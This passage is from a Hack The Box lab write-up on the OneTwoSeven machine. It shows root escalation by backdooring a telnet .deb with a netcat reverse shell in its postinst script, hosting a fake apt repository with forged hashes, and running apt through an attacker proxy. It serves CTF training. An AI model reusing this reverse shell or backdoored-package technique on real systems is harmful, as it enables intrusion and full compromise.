class="line">deb http:&#x2F;&#x2F;packages.onetwoseven.htb&#x2F;devuan ascii main</span><br><span class="line">www-admin-data@onetwoseven:&#x2F;$</span><br></pre></td></tr></table></figure>
<p>In <code>/etc/apt/sources.list.d/onetwoseven.list</code> there’s an entry for <code>packages.onetwoseven.htb</code>. Let’s use that.<br>I started another burp listener on port 8181 :<br><img src="/images/hackthebox/onetwoseven/31.png" alt=""><br>And I added <code>packages.onetwoseven.htb</code> to my <code>hosts</code> file and made it point to my ip :<br><img src="/images/hackthebox/onetwoseven/32.png" alt=""><br>Now any request to <code>packages.onetwoseven.htb</code> through the proxy server will be sent to my ip. Now we need to create the fake repository and the malicious package.<br>I chose <code>telnet</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">www-admin-data@onetwoseven:&#x2F;$ dpkg -l | grep telnet</span><br><span class="line">ii  telnet                                 0.17-41                            amd64        basic telnet client</span><br><span class="line">www-admin-data@onetwoseven:&#x2F;$ apt-cache show telnet </span><br><span class="line">Package: telnet</span><br><span class="line">Version: 0.17-41</span><br><span class="line">Installed-Size: 157</span><br><span class="line">Maintainer: Mats Erik Andersson &lt;mats.andersson@gisladisker.se&gt;</span><br><span class="line">Architecture: amd64</span><br><span class="line">Replaces: netstd</span><br><span class="line">Provides: telnet-client</span><br><span class="line">Depends: netbase, libc6 (&gt;&#x3D; 2.15), libstdc++6 (&gt;&#x3D; 5)</span><br><span class="line">Description: basic telnet client</span><br><span class="line">Description-md5: 80f238fa65c82c04a1590f2a062f47bb</span><br><span class="line">Source: netkit-telnet</span><br><span class="line">Tag: admin::login, interface::shell, network::client, protocol::ipv6,</span><br><span class="line"> protocol::telnet, role::program, uitoolkit::ncurses, use::login</span><br><span class="line">Section: net</span><br><span class="line">Priority: standard</span><br><span class="line">Filename: pool&#x2F;DEBIAN&#x2F;main&#x2F;n&#x2F;netkit-telnet&#x2F;telnet_0.17-41_amd64.deb</span><br><span class="line">Size: 72008</span><br><span class="line">MD5sum: 3409d7e40403699b890c68323e200874</span><br><span class="line">SHA256: 95aa315eb5b3be12fc7a91a8d7ee8eba7af99120641067ec39694200e034a5ae</span><br></pre></td></tr></table></figure>
<p>The version on the box is <code>0.17-41</code>, I searched for it and downloaded it :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm# wget ftp.br.debian.org&#x2F;debian&#x2F;pool&#x2F;main&#x2F;n&#x2F;netkit-telnet&#x2F;telnet_0.17-41_amd64.deb</span><br><span class="line">--2019-08-29 23:10:54--  http:&#x2F;&#x2F;ftp.br.debian.org&#x2F;debian&#x2F;pool&#x2F;main&#x2F;n&#x2F;netkit-telnet&#x2F;telnet_0.17-41_amd64.deb</span><br><span class="line">Resolving ftp.br.debian.org (ftp.br.debian.org)... 200.236.31.3, 2801:82:80ff:8000::4</span><br><span class="line">Connecting to ftp.br.debian.org (ftp.br.debian.org)|200.236.31.3|:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 72008 (70K) [application&#x2F;x-debian-package]</span><br><span class="line">Saving to: ‘telnet_0.17-41_amd64.deb’</span><br><span class="line"></span><br><span class="line">telnet_0.17-41_amd64.deb                             100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]  70.32K   113KB&#x2F;s    in 0.6s    </span><br><span class="line"></span><br><span class="line">2019-08-29 23:10:56 (113 KB&#x2F;s) - ‘telnet_0.17-41_amd64.deb’ saved [72008&#x2F;72008]</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm# file telnet_0.17-41_amd64.deb </span><br><span class="line">telnet_0.17-41_amd64.deb: Debian binary package (format 2.0)</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm#</span><br></pre></td></tr></table></figure>
<p>We will unpack it :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm# dpkg-deb -R .&#x2F;telnet_0.17-41_amd64.deb .&#x2F;extract</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm# ls -la .&#x2F;extract&#x2F;</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x 4 root root 4096 Aug 29 23:12 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Aug 29 23:12 ..</span><br><span class="line">drwxr-xr-x 2 root root 4096 Nov  7  2016 DEBIAN</span><br><span class="line">drwxr-xr-x 4 root root 4096 Nov  7  2016 usr</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm#</span><br></pre></td></tr></table></figure>
<p>And add a reverse shell payload in the post install script :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;extract&#x2F;DEBIAN# nano postinst</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;extract&#x2F;DEBIAN# cat postinst</span><br><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"># $Id: postinst,v 1.4 2000&#x2F;08&#x2F;23 10:08:42 herbert Exp $</span><br><span class="line"></span><br><span class="line">set -e</span><br><span class="line"></span><br><span class="line">update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;telnet telnet &#x2F;usr&#x2F;bin&#x2F;telnet.netkit 100 \</span><br><span class="line">                    --slave &#x2F;usr&#x2F;share&#x2F;man&#x2F;man1&#x2F;telnet.1.gz telnet.1.gz \</span><br><span class="line">                                &#x2F;usr&#x2F;share&#x2F;man&#x2F;man1&#x2F;telnet.netkit.1.gz</span><br><span class="line"></span><br><span class="line"># Automatically added by dh_installmenu</span><br><span class="line">if [ &quot;$1&quot; &#x3D; &quot;configure&quot; ] &amp;&amp; [ -x &quot;&#96;which update-menus 2&gt;&#x2F;dev&#x2F;null&#96;&quot; ]; then</span><br><span class="line">        update-menus</span><br><span class="line">fi</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1338 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line"># End automatically added section</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;extract&#x2F;DEBIAN#</span><br></pre></td></tr></table></figure>
<p>Then we will pack it again and change the version number :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm# dpkg-deb -b extract&#x2F; telnet_0.17-42_amd64.deb</span><br><span class="line">dpkg-deb: building package &#39;telnet&#39; in &#39;telnet_0.17-42_amd64.deb&#39;.</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm# ls -la</span><br><span class="line">total 156</span><br><span class="line">drwxr-xr-x 3 root root  4096 Aug 29 23:18 .</span><br><span class="line">drwxr-xr-x 3 root root  4096 Aug 29 23:16 ..</span><br><span class="line">drwxr-xr-x 4 root root  4096 Aug 29 23:12 extract</span><br><span class="line">-rw-r--r-- 1 root root 72008 Nov 10  2016 telnet_0.17-41_amd64.deb</span><br><span class="line">-rw-r--r-- 1 root root 72176 Aug 29 23:18 telnet_0.17-42_amd64.deb</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm#</span><br></pre></td></tr></table></figure>
<p>What’s left is to create the repository, its name will be <code>devuan</code> as we saw in the sources list :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-admin-data@onetwoseven:&#x2F;$ cat &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;onetwoseven.list </span><br><span class="line"># OneTwoSeven special packages - not yet in use</span><br><span class="line">deb http:&#x2F;&#x2F;packages.onetwoseven.htb&#x2F;devuan ascii main</span><br></pre></td></tr></table></figure>
<p>The path for the package will be :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pool&#x2F;DEBIAN&#x2F;main&#x2F;n&#x2F;netkit-telnet&#x2F;telnet_0.17-42_amd64.deb</span><br></pre></td></tr></table></figure>
<p>as we saw in the <code>apt-cache</code> result :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">www-admin-data@onetwoseven:&#x2F;$ apt-cache show telnet </span><br><span class="line">Package: telnet</span><br><span class="line">Version: 0.17-41</span><br><span class="line">Installed-Size: 157</span><br><span class="line">Maintainer: Mats Erik Andersson &lt;mats.andersson@gisladisker.se&gt;</span><br><span class="line">Architecture: amd64</span><br><span class="line">Replaces: netstd</span><br><span class="line">Provides: telnet-client</span><br><span class="line">Depends: netbase, libc6 (&gt;&#x3D; 2.15), libstdc++6 (&gt;&#x3D; 5)</span><br><span class="line">Description: basic telnet client</span><br><span class="line">Description-md5: 80f238fa65c82c04a1590f2a062f47bb</span><br><span class="line">Source: netkit-telnet</span><br><span class="line">Tag: admin::login, interface::shell, network::client, protocol::ipv6,</span><br><span class="line"> protocol::telnet, role::program, uitoolkit::ncurses, use::login</span><br><span class="line">Section: net</span><br><span class="line">Priority: standard</span><br><span class="line">Filename: pool&#x2F;DEBIAN&#x2F;main&#x2F;n&#x2F;netkit-telnet&#x2F;telnet_0.17-41_amd64.deb</span><br><span class="line">Size: 72008</span><br><span class="line">MD5sum: 3409d7e40403699b890c68323e200874</span><br><span class="line">SHA256: 95aa315eb5b3be12fc7a91a8d7ee8eba7af99120641067ec39694200e034a5ae</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm# mkdir devuan &amp;&amp; cd $_</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan# mkdir pool &amp;&amp; cd $_</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;pool# mkdir DEBIAN &amp;&amp; cd $_</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;pool&#x2F;DEBIAN# mkdir main &amp;&amp; cd $_</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;pool&#x2F;DEBIAN&#x2F;main# mkdir n &amp;&amp; cd $_</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;pool&#x2F;DEBIAN&#x2F;main&#x2F;n# mkdir netkit-telnet</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;pool&#x2F;DEBIAN&#x2F;main&#x2F;n# cd netkit-telnet&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;pool&#x2F;DEBIAN&#x2F;main&#x2F;n&#x2F;netkit-telnet# cp ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;telnet_0.17-42_amd64.deb .</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;pool&#x2F;DEBIAN&#x2F;main&#x2F;n&#x2F;netkit-telnet# ls -la</span><br><span class="line">total 80</span><br><span class="line">drwxr-xr-x 2 root root  4096 Aug 29 23:24 .</span><br><span class="line">drwxr-xr-x 3 root root  4096 Aug 29 23:23 ..</span><br><span class="line">-rw-r--r-- 1 root root 72176 Aug 29 23:24 telnet_0.17-42_amd64.deb</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;pool&#x2F;DEBIAN&#x2F;main&#x2F;n&#x2F;netkit-telnet#</span><br></pre></td></tr></table></figure>
<p>Now we need to create a <code>Packages</code> file, we’ll copy the stuff from <code>apt-cache show telnet</code> and change the version number, size and the hashes. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;pool&#x2F;DEBIAN&#x2F;main&#x2F;n&#x2F;netkit-telnet# ls -la</span><br><span class="line">total 80</span><br><span class="line">drwxr-xr-x 2 root root  4096 Aug 29 23:24 .</span><br><span class="line">drwxr-xr-x 3 root root  4096 Aug 29 23:23 ..</span><br><span class="line">-rw-r--r-- 1 root root 72176 Aug 29 23:24 telnet_0.17-42_amd64.deb</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;pool&#x2F;DEBIAN&#x2F;main&#x2F;n&#x2F;netkit-telnet# md5sum telnet_0.17-42_amd64.deb                                                                                       </span><br><span class="line">2d29b3d5179226f9a772e370c1df05d9  telnet_0.17-42_amd64.deb</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;pool&#x2F;DEBIAN&#x2F;main&#x2F;n&#x2F;netkit-telnet# sha256sum telnet_0.17-42_amd64.deb </span><br><span class="line">77e432f0017f8a1a035468a7fd02749a0e253aa61417fe801205d03fc41bdacd  telnet_0.17-42_amd64.deb</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;pool&#x2F;DEBIAN&#x2F;main&#x2F;n&#x2F;netkit-telnet#</span><br></pre></td></tr></table></figure>
<p><code>Packages</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Package: telnet</span><br><span class="line">Version: 0.17-42</span><br><span class="line">Installed-Size: 157</span><br><span class="line">Maintainer: Mats Erik Andersson &lt;mats.andersson@gisladisker.se&gt;</span><br><span class="line">Architecture: amd64</span><br><span class="line">Replaces: netstd</span><br><span class="line">Provides: telnet-client</span><br><span class="line">Depends: netbase, libc6 (&gt;&#x3D; 2.15), libstdc++6 (&gt;&#x3D; 5)</span><br><span class="line">Description: basic telnet client</span><br><span class="line">Description-md5: 80f238fa65c82c04a1590f2a062f47bb</span><br><span class="line">Source: netkit-telnet</span><br><span class="line">Tag: admin::login, interface::shell, network::client, protocol::ipv6,</span><br><span class="line"> protocol::telnet, role::program, uitoolkit::ncurses, use::login</span><br><span class="line">Section: net</span><br><span class="line">Priority: standard</span><br><span class="line">Filename: pool&#x2F;DEBIAN&#x2F;main&#x2F;n&#x2F;netkit-telnet&#x2F;telnet_0.17-42_amd64.deb</span><br><span class="line">Size: 72176</span><br><span class="line">MD5sum: 2d29b3d5179226f9a772e370c1df05d9</span><br><span class="line">SHA256: 77e432f0017f8a1a035468a7fd02749a0e253aa61417fe801205d03fc41bdacd</span><br></pre></td></tr></table></figure>
<p>Path for the <code>Packages</code> file will be <code>dists/ascii/main/binary-amd64</code>, we know it’s <code>ascii/main</code> from the sources list :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-admin-data@onetwoseven:&#x2F;$ cat &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;onetwoseven.list </span><br><span class="line"># OneTwoSeven special packages - not yet in use</span><br><span class="line">deb http:&#x2F;&#x2F;packages.onetwoseven.htb&#x2F;devuan ascii main</span><br></pre></td></tr></table></figure>
<p>And <code>binary-amd64</code> because the package’s architecture is <code>amd-64</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan# mkdir dists &amp;&amp; cd $_</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;dists# mkdir ascii &amp;&amp; cd $_</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;dists&#x2F;ascii# mkdir main &amp;&amp; cd $_</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;dists&#x2F;ascii&#x2F;main# mkdir binary-amd64 &amp;&amp; cd $_</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;dists&#x2F;ascii&#x2F;main&#x2F;binary-amd64# cp ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;Packages .</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan&#x2F;dists&#x2F;ascii&#x2F;main&#x2F;binary-amd64#</span><br></pre></td></tr></table></figure>
<p>And that’s it for the repository.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;onetwoseven&#x2F;apt-mitm&#x2F;devuan# tree</span><br><span class="line">.</span><br><span class="line">├── dists</span><br><span class="line">│   └── ascii</span><br><span class="line">│       └── main</span><br><span class="line">│           └── binary-amd64</span><br><span class="line">│               └── Packages</span><br><span class="line">└── pool</span><br><span class="line">    └── DEBIAN</span><br><span class="line">        └── main</span><br><span class="line">            └── n</span><br><span class="line">                └── netkit-telnet</span><br><span class="line">                    └── telnet_0.17-42_amd64.deb</span><br><span class="line"></span><br><span class="line">9 directories, 2 files</span><br></pre></td></tr></table></figure>
<p>What’s left is to run a python <code>http</code> server in <code>~/Desktop/HTB/boxes/onetwoseven/apt-mitm/</code> and everything is done.<br>I exported the <code>http_proxy</code> variable and I ran <code>apt-get update</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-admin-data@onetwoseven:&#x2F;$ export http_proxy&#x3D;http:&#x2F;&#x2F;10.10.xx.xx:8181&#x2F;</span><br><span class="line">www-admin-data@onetwoseven:&#x2F;$ sudo apt-get update</span><br></pre></td></tr></table></figure>
<p>Then I ran <code>apt-get upgrade</code> :<br><img src="/images/hackthebox/onetwoseven/33.png" alt=""></p>
<p><img src="/images/hackthebox/onetwoseven/34.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/unattended/">Hack The Box - Unattended</a><br>Next Hack The Box write-up : <a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-08-31</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/code-analysis/" rel="tag">#code-analysis</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/networking/" rel="tag">#networking</a> <a class="tag-link" href="/tags/php/" rel="tag">#php</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
